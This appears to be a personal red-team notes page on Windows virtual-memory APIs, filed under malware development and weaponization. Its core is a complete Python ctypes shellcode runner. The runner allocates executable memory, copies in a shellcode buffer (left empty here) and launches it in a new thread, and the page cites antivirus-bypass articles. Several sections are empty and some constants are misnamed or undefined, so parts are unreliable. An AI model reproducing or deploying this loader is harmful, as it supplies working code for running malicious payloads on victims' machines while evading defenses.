# Virtual Allocation

### VirtualAlloc

Reserves, commits, or changes the state of a region of memory within the virtual address space of the calling process.

```python
import ctypes
import ctypes.wintypes as wt

PAGE_READWRITE = 0x04
PAGE_READWRITE_EXECUTE = 0x40
PAGE_READ_EXECUTE = 0x20

kernel32 = ctypes.windll.kernel32

VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.restype = ctypes.c_void_p
```

### VirtualFree

Releases, decommits, or releases and decommits a region of memory within the virtual address space of the calling process.

```python

```

### VirtualFreeEx

```python

```

### VirtualProtect

Changes the protection on a region of committed pages in the virtual address space of the calling process.

```
VirtualProtect(memory_execute, memory_allocation, PAGE_EXECUTE, &ignore);
```

### VirtualProtectEx

```python
VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = [
	wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.LPVOID]
VirtualProtectEx.restype = wt.BOOL
```

### Copy Memory

```
CopyMemory(&destMemAddr,&source, length);
```

### Move Memory

```python
RtlMoveMemory = kernel32.RtlMoveMemory

RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
RtlMoveMemory.restype = wt.LPVOID
```

```c
MoveMemory(&destMemAddr, &source, length);
FillMemory(&destMemAddr, 1, ByteByteOfShellcode);
```

```python
WaitForSingleObject = kernel32.WaitForSingleObject

WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
WaitForSingleObject.restype = wt.DWORD
```

Another variant but changing data types from **WinAPI** to **C Runtime**.

```python
import ctypes

shellcode = bytearray()
 
kernel32 = ctypes.windll.kernel32

VirtualAlloc = kernel32.VirtualAlloc
RtlMoveMemory = kernel32.RtlMoveMemory
CreateThread = kernel32.CreateThread
WaitForSingleObject = kernel32.WaitForSingleObject

pointer = VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)),
                   ctypes.c_int(0x3000), ctypes.c_int(0x40))
 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
RtlMoveMemory(ctypes.c_int(pointer), buf, ctypes.c_int(len(shellcode)))
 
handle_thread = CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(pointer),
                  ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
 
WaitForSingleObject(ctypes.c_int(handle_thread),ctypes.c_int(-1))
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/C/Malware Development/Simple Loader/Virtual Allocation/WinAPI]]

### Source Repositories

- [momo1239: buffshark-shellcode-runner](https://github.com/momo1239/buffshark-shellcode-runner)

### Debasish Mandal

- [Debasish Mandal: Execute ShellCode Using Python](https://www.debasish.in/2012/04/execute-shellcode-using-python.html)

### Pentura Lab

- [Pentura Lab: Execute Shellcode, Bypassing Anti-Virus…](https://penturalabs.wordpress.com/2014/07/18/execute-shellcode-bypassing-anti-virus/)